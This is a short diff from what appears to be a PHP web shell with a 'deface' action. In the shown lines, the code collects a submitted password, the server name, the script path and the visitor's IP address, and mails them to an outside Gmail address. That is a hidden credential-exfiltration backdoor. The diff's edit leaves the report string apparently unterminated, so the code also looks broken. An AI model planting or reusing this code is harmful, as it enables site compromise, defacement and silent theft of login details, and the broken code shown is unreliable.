@@ -526,7 +526,8 @@ $Array = [
 		$password = $_POST['pass'];
 		$server_name = $_SERVER['SERVER_NAME'];
 		$php_self = $_SERVER['PHP_SELF'];
-		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
+		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . "  City: {$city}\n
+  		Login: $server_name$php_self\nPass: $password\n
 		@mail('ribelcyberteam@gmail.com', 'Hehehe', $report_bug);
 		}
 		if($_7['id'] == 'deface'){
